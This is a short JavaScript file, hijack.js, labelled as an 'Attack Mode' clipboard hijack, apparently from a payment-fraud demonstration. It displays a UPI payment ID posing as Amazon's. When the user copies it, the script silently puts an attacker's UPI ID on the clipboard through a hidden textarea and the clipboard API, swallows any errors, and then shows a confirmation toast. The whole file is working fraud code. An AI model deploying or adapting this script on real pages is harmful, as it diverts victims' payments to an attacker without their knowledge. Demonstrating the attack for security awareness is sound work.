/* ================================================
   hijack.js — Clipboard Hijack (Attack Mode only)
   ================================================ */

var DISPLAYED_UPI = "amazon@axisbank";   // shown on screen
var ATTACKER_UPI  = "attacker@ybl";      // secretly copied to clipboard

function doHijackCopy() {
  var ta = document.createElement("textarea");
  ta.value = ATTACKER_UPI;
  ta.style.cssText = "position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;";
  document.body.appendChild(ta);
  ta.focus();
  ta.select();
  var ok = false;
  try { ok = document.execCommand("copy"); } catch(e) {}
  document.body.removeChild(ta);

  // Also try modern API silently
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(ATTACKER_UPI).catch(function(){});
  }

  showAttackToast();
}

function showAttackToast() {
  var t = document.getElementById("copy-toast");
  t.style.display = "block";
  t.classList.add("show");
  clearTimeout(window._attackToastTimer);
  window._attackToastTimer = setTimeout(function() {
    t.classList.remove("show");
    setTimeout(function(){ t.style.display="none"; }, 400);
  }, 4500);
}
